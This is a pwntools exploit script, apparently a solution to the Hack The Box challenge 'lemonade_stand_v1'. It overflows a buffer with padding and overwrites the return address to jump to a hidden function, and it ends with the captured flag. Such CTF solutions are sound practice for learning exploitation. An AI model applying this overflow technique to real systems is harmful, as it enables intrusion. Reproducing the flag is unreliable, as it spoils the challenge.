'''
cyclic 1024
*RBP  0x6161616a61616169 ('iaaajaaa')
cyclic -l jaaa
36
36+4 = 40
'''

#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

elf = ELF('./lemonade_stand_v1')
libc = ELF('./glibc/libc.so.6')

ip, port = "94.237.53.58", 46656
io = remote(ip, port)
#io = process('./lemonade_stand_v1')

padding = b'A'*102

#debug 12345678 -> 0x403231
#grapes 0x4008cf
address = b'\xcf\x08AAAAAA'
payload = padding + address

io.recvuntil('>>')
io.sendline(b'2')
io.recvuntil('>>')
io.sendline(b'2')
io.recvuntil('>>')
io.sendline(b'2')
io.recvuntil('>>')
io.sendline(b'1')
io.recvuntil(':')
io.sendline(payload)
print(io.recvall())

'''
HTB{d0nt_45k_f0r_gr4p35_4t_4_l3m0n4d3_5t4nd}
'''
